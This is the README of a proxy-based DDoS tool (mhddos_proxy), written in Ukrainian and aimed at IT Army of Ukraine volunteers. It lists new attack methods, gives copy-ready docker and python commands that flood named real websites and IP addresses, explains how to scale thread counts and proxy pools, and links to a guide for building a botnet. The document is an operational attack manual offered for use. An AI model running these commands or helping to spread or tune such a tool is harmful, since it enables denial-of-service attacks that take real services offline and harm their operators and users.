## DDoS Tool for IT Army of Ukraine 

- Вбудована база проксі для атаки з величезної кількості IP по всьому світу
- Можливість задавати багато цілей з автоматичним балансуванням навантаження
- Безліч різноманітних DDoS методів
- Ефективне використання ресурсів завдяки асихронній архітектурі

### ⏱ Останні оновлення
  
Оновлення версії для Windows | Mac | Linux | Android | Docker: https://telegra.ph/Onovlennya-mhddos-proxy-04-16  

- **18.05.2022**
  - Додано налаштування `--copies` для запуску декількох копій (рекомендовано до використання при наявності 4+ CPU та мережі > 100 Mb/s).

- **15.05.2022**
  - Повністю оновлена асинхронна версія, що забезпечує максимальну ефективність та мінімальне навантаження на систему
  - Ефективна робота зі значно більшими значеннями параметру `-t` (до 10k) без ризику "підвісити" усю машину
  - Абсолютно новий алгоритм розподілення навантаження між цілями з метою досягнення максимальної потужності атаки
  - Додано атаки `RGET`, `RHEAD`, `RHEX` та `STOMP`.

<details>
  <summary>📜 Раніше</summary>

- **23.04.2022** 
  - Змінено прапорець `--vpn` - тепер ваш IP/VPN використовується **разом** із проксі, а не замість. Щоб досягти попередньої поведінки, використайте `--vpn 100`
- **20.04.2022**
  - Значно покращене використання ресурсів системи для ефективної атаки
  - Додано параметр `--udp-threads` для контролю потужності UDP атак (за замовчуванням 1)
- **18.04.2022** 
  - В режимі `--debug` додано статистику "усього" по всіх цілях
  - Додано більше проксі
- **13.04.2022** 
  - Додано можливість відключати цілі та додавати коментарі у файлі конфігурації - тепер рядки що починаються на символ # ігноруються
  - Виправлено проблему повного зависання скрипта після тривалої роботи та інші помилки при зміні циклу
  - Виправлено відображення кольорів на Windows (без редагування реєстру)
  - Тепер у випадку недоступності усіх цілей скрипт буде очікувати, замість повної зупинки
- **09.04.2022** Нова система проксі - тепер кожен отримує ~200 проксі для атаки з загального пулу понад 10.000. Параметри `-p` (`--period`) та `--proxy-timeout` більше не використовуються
- **04.04.2022** Додано можливість використання власного списку проксі для атаки - [інструкція](#власні-проксі)
- **03.04.2022** Виправлена помилка Too many open files (дякую, @kobzar-darmogray та @euclid-catoptrics)
- **02.04.2022** Робочі потоки більше не перезапускаються на кожен цикл, а використовуються повторно. Також виправлена робота Ctrl-C
- **01.04.2022** Оновленно метод CFB у відповідності з MHDDoS.
- **31.03.2022** Додано надійні DNS сервери для резолвінгу цілі, замість системних. (1.1.1.1, 8.8.8.8 etc.)
- **29.03.2022** Додано підтримку локального файлу конфігурації (дуже дякую, @kobzar-darmogray).
- **28.03.2022** Додано табличний вивід `--table` (дуже дякую, @alexneo2003).
- **27.03.2022**
    - Дозволено запуск методів DBG, BOMB (дякую @drew-kun за PR) та KILLER для відповідності оригінальному MHDDoS.
- **26.03.2022**
    - Запуск усіх обраних атак, замість випадкового вибору
    - Зменшено використання RAM на великій кількості цілей - тепер на RAM впливає тільки параметр `-t`
    - Додане кешування DNS і корректна обробка проблем з резолвінгом
- **25.03.2022** Додано режим VPN замість проксі (прапорець `--vpn`)
- **25.03.2022** MHDDoS включено до складу репозиторію для більшого контролю над розробкою і захистом від неочікуваних
  змін
</details>

### 💽 Встановлення | Installation - [інструкції ТУТ](/docs/installation.md)

### 🕹 Запуск | Running (наведено різні варіанти цілей)

#### Docker (для Linux додавайте sudo на початку команди)

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Python (якщо не працює - просто python або python3.10 замість python3)

    python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

### 🛠 Налаштування (більше у розділі [CLI](#cli))

**Усі параметри можна комбінувати**, можна вказувати і до і після переліку цілей

Змінити навантаження - `-t XXXX` - максимальна кількість одночасно відкритих зʼєднань, за замовченням - 1000 (якщо на машині одне CPU) або 7500 (якщо більше одного).  

***Для Linux додавайте `sudo` на початку команди з docker***  

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru

Щоб переглянути інформацію про хід атаки, додайте прапорець `--table` для таблиці, `--debug` для тексту

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru
    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru
    
Щоб атакувати цілі від https://t.me/itarmyofukraine2022 додайте параметр `--itarmy`  

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table --itarmy

### 📌Автоматичний шукач нових проксі для mhddos_proxy
Сам скрипт та інструкції по встановленню тут: https://github.com/porthole-ascend-cinnamon/proxy_finder

### 🐳 Комьюніті
- [Детальний розбір mhddos_proxy та інструкції по встановленню](docs/installation.md)
- [Аналіз засобу mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
- [Приклад запуску через docker на OpenWRT](https://youtu.be/MlL6fuDcWlI)
- [Створення ботнету з 30+ безкоштовних та автономних(працюють навіть при вимкненому ПК) Linux-серверів](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
- [VPN](https://auto-ddos.notion.site/VPN-5e45e0aadccc449e83fea45d56385b54)

### CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--table]
                     [--debug]
                     [--vpn]
                     [--rpc RPC] 
                     [--http-methods METHOD [METHOD ...]]
                     [--itarmy]
                     [--copies COPIES]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL|path  URL or local path to file with attack targets
      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
      --table                Print log as table
      --debug                Print log as text
      --vpn                  Use both my IP and proxies for the attack. Optionally, specify a percent of using my IP (default is 10%)
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
      --http-methods GET     List of HTTP(s) attack methods to use (default is GET + POST|STRESS).
      --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
      --copies 1             Number of copies to run (default is 1)

### Власні проксі

#### Формат файлу:

    IP:PORT
    IP:PORT:username:password
    username:password@IP:PORT
    protocol://IP:PORT
    protocol://IP:PORT:username:password
    protocol://username:password@IP:PORT
де `protocol` може бути одним з 3-ох: http | socks4 | socks5, якщо `protocol`не вказувати, то буде обрано за замовчуванням - http  
наприклад для публічного проксі: protocol=socks4 IP=114.231.123.38 PORT=3065 формат буде таким:  
```shell
socks4://114.231.123.38:3065
```
а для приватного: protocol=socks4 IP=114.231.123.38 PORT=3065 username=isdfuser password=ashd1spass формат може бути одним з таких:  
```shell
socks4://114.231.123.38:3065:isdfuser:ashd1spass
socks4://isdfuser:ashd1spass@IP:PORT
```
  
**URL - Віддалений файл для Python та Docker**

    python3 runner.py https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
де https://pastebin.com/raw/UkFWzLOt - ваша веб-сторінка зі списком проксі (кожен проксі з нового рядка)  
  
**path - Для Python**  
  
Покладіть файл у папку з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)

    python3 runner.py --proxies proxies.txt https://ria.ru

де `proxies.txt` - ваша ваш файл зі списком проксі (кожен проксі з нового рядка)
